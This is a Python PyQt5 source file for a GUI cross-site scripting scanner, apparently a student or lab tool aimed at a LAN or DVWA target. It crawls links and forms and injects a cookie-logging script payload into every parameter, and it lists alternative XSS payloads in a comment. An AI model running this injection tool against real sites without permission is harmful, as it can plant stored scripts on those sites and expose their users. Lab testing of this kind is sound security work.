import re

from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
import requests
from bs4 import BeautifulSoup

import sys
# 窗口
class MainWindow(QMainWindow):
    def __init__(self, *args, **kwargs):
        super(MainWindow, self).__init__(*args, **kwargs)
        self.width = 960
        self.height = 720
        self.payloads = "<script>console.log(document.cookie);</script>" # <img src=x onerror=alert(222)>,<script>alert(/xss/)</script>
        self.init_font()
        self.init_Layout()
        self.init_Window()

    def init_font(self):
        # 大字体
        self.tip_font = QFont()
        self.tip_font.setPointSize(20)
        self.tip_font.setBold(True)
        # payload_tip
        self.tip_payload = QFont()
        self.tip_payload.setPointSize(13)
        self.tip_payload.setBold(True)
        # 提示框大小
        self.font_width = 200
        self.font_height = 50
        # 内容大小
        self.text_font = QFont()
        self.text_font.setPointSize(15)

    # 起始框架
    def init_Layout(self):
        # 总框架设置
        VBox = QVBoxLayout()
        HBox_top = QHBoxLayout()
        HBox_payload = QHBoxLayout()
        HBox_res = QHBoxLayout()

        # 主界面
        init_layout = QWidget()
        # url栏
        url_tip = QLabel("网址：")
        url_tip.setFont(self.tip_font)
        HBox_top.addWidget(url_tip)

        self.url_text = QLineEdit("http://192.168.17.140/") # http://127.0.0.1/DVWA/vulnerabilities/xss_r/
        self.url_text.setFont(self.text_font)
        HBox_top.addWidget(self.url_text)

        self.attack_action = QPushButton("确认",self)
        self.attack_action.setFixedSize(self.font_width,self.font_height)
        self.attack_action.setFont(self.tip_font)
        self.attack_action.clicked.connect(lambda:self.attack_XSS())
        HBox_top.addWidget(self.attack_action)

        # payload栏
        payload_tip = QLabel("payload：\n(单个)")
        payload_tip.setFont(self.tip_payload)
        HBox_payload.addWidget(payload_tip)

        self.payload_text = QTextEdit()
        self.payload_text.setPlainText(self.payloads)
        self.payload_text.setFont(self.text_font)
        self.payload_text.setFixedHeight(self.height // 6)
        HBox_payload.addWidget(self.payload_text)

        # 提示栏
        res_tip = QLabel("结果：")
        res_tip.setFont(self.tip_font)
        HBox_res.addWidget(res_tip)

        self.res_text = QTextEdit()
        self.res_text.setFont(self.text_font)
        HBox_res.addWidget(self.res_text)

        # 组合布局
        VBox.addLayout(HBox_top)
        VBox.addLayout(HBox_payload)
        VBox.addLayout(HBox_res)
        init_layout.setLayout(VBox)
        self.setCentralWidget(init_layout)

    # 初始化窗口
    def init_Window(self):
        # 窗口属性 并 居中
        self.resize(self.width, self.height)
        center_point = QDesktopWidget().availableGeometry().center()
        x = center_point.x()
        y = center_point.y()
        self.move(x - self.width // 2, y - self.height // 2)
        # 设置窗口加入组件
        self.show()

    # 1、攻击
    def attack_XSS(self):
        self.res_text.setPlainText("[.] Scanning...")
        self.attack_action.setEnabled(False)
        url = self.url_text.text()
        self.payload = self.payload_text.toPlainText()
        payload = self.payload
        # 创建线程进行扫描
        self.attack = AttackThread()
        para = [url,payload]
        self.attack.receive_signal.connect(self.attack.receive_Signal)
        self.attack.send_signal.connect(self.update_Text)
        self.attack.receive_signal.emit(para)
        self.attack.start()
        return

    # 2、更新数据
    def update_Text(self,res):
        if res == "clear":
            self.res_text.clear()
        elif res == "end":
            self.res_text.insertPlainText("[-] END!")
            self.attack.terminate()
            self.attack_action.setEnabled(True)
        else:
            self.res_text.insertPlainText(res)

# 攻击子线程
class AttackThread(QThread):
    receive_signal = pyqtSignal(list)
    send_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.DOM_pay = ['.innerHTML','.outerHTML','document.getElementById','document.write']
        self.header = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 Edg/112.0.1722.68"}
    # 运行扫描
    def run(self):
        try:
            self.attack()
        except:
            self.send_Signal("[!] Exception!\n")
        finally:
            self.send_Signal("end")

    # 接受主线程参数
    def receive_Signal(self,para):
        self.url = para[0]
        self.payloads = para[1]
        self.paras = {'name':self.payloads,'value':self.payloads}

    # 向主线程发送参数
    def send_Signal(self,data):
        self.send_signal.emit(data)

    # 攻击主函数
    def attack(self):
        url_list = self.scan_HTML_Link(self.url)
        queue = [(self.url,"GET",self.paras)]
        uesd_lst = []
        queue += url_list
        self.send_Signal("clear")
        while queue:
            new_url_tup = queue.pop(0)
            while len(queue) > 0 and new_url_tup in uesd_lst:
                new_url_tup = queue.pop(0)
            url_list = self.scan_HTML_Link(new_url_tup[0])
            for i in url_list:
                if i not in uesd_lst:
                    queue.append(i)
            uesd_lst.append(new_url_tup)

            self.send_Signal("[*] URL:{}".format(new_url_tup[0] + '\n'))

            self.scan_XSS(new_url_tup[0],new_url_tup[1],new_url_tup[2])

            self.scan_DOM_XSS(new_url_tup[0],self.DOM_pay)

    # 扫描网页中所有的链接
    def scan_HTML_Link(self,url):
        try:
            res = requests.get(url, timeout=(1, 3))
            soup = BeautifulSoup(res.text, 'html.parser')
            # form链接分析
            res = soup.find_all('a')
            url_list = []
            for i in res:
                try:
                    old_url = i['href']
                    if "http" in old_url or "https" in old_url or "www" in old_url:
                        new_url = old_url
                    elif old_url == '/' or old_url == '#':
                        new_url = url
                    elif '/' not in old_url:
                        local = url.rfind('/')
                        new_url = url[0:local+1] + old_url
                    else:
                        new_url = url + old_url

                    local = new_url.rfind('?')
                    if local > 0:
                        paras_lst = new_url[local+1:].split("&")
                        for i in range(len(paras_lst)):
                            local_equal = paras_lst[i].rfind('=')
                            if local_equal > 0:
                                paras_lst[i] = paras_lst[i][:local_equal]
                        para_dict = {}
                        for i in paras_lst:
                            para_dict[i] = self.payloads
                        url_list.append((new_url,'GET',para_dict))
                    else:
                        url_list.append((new_url,'GET',self.paras))
                except:
                    continue
        except:
            return []
        # form链接分析
        res = soup.find_all('form')
        for form in res:
            try:
                old_url = form['action']
                if "http" in old_url or "https" in old_url or "www" in old_url:
                    new_url = old_url
                elif old_url == '/' or old_url == '#':
                    new_url = url
                elif '/' not in old_url:
                    local = url.rfind('/')
                    new_url = url[0:local+1] + old_url
                else:
                    new_url = url + old_url
            except:
                new_url = url
            try:
                mode = form['method'].upper()
            except:
                mode = 'GET'
            para_dict = {}
            for i in form.find_all(True):
                try:
                    para_dict[i['name']] = self.payloads
                    para_dict[i['name']] = i['value']
                except:
                    continue
            if len(para_dict) > 0:
                url_list.append((new_url,mode,para_dict))
            else:
                url_list.append((new_url,mode,self.paras))
        return url_list

    # 反射性XSS / 存储型XSS（url列表元组[(url,mode,para_dict)]）（测试一次，for写在这里，带参访问和不带参访问）
    def scan_XSS(self,url,mode,para_dict):
        try:
            local_question = url.find('?')
            xss_url = url[0:local_question] if local_question > 0 else url
            xss_url = xss_url.lstrip("/")
            if mode == "GET":
                res = requests.get(xss_url, timeout=(1, 3), headers=self.header, params=para_dict)
            elif mode == "POST":
                res = requests.post(xss_url, timeout=(1, 3), headers=self.header, data=para_dict)
            if res.status_code == 200:
                if self.payloads in res.text:
                    self.send_Signal("[+] XSS: " + res.url + '\n')
                    # self.send_Signal("[+] Reflective XSS: " + xss_url + '\n')
                    res = requests.get(xss_url, timeout=(1, 3), headers=self.header,params={})
                    if res.status_code == 200 and self.payloads.lstrip("<script>").rstrip("</script>") in res.text:
                        self.send_Signal("[+] Storage XSS: " + xss_url + '\n')
                    # else:
                    #     self.send_Signal("[-] No Storage XSS in this Website!\n")
                    # return
                else:
                    self.send_Signal("[-] NO XSS in this Website!\n")
                    # self.send_Signal("[!] NO Reflective or Storage XSS in this Website!\n")
                    return
            else:
                self.send_Signal("[!] URL error or Website not opened!\n")
                return
        except:
            self.send_Signal("[!] Link website failed!\n")
            return


    # DOM XSS测试
    def scan_DOM_XSS(self,url,payloads):
        try:
            res = requests.get(url, timeout=(1, 3), headers=self.header)
            if res.status_code == 200:
                soup = BeautifulSoup(res.content, 'html.parser')
                res = soup.find_all("script")
                for content in res:
                    for payload in payloads:
                        if payload in str(content):
                            self.send_Signal("[+] DOM XSS:{}".format(url + ":" + payload + "\n\n"))
                            return
                else:
                    self.send_Signal("[-] No DOM XSS in this Website!\n\n")
                    return
            else:
                self.send_Signal("[!] URL error or Website not opened!\n\n")
                return
        except:
            self.send_Signal("[!] Link website failed!\n\n")
            return

if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setApplicationName("XSS扫描")
    window = MainWindow()
    app.exec()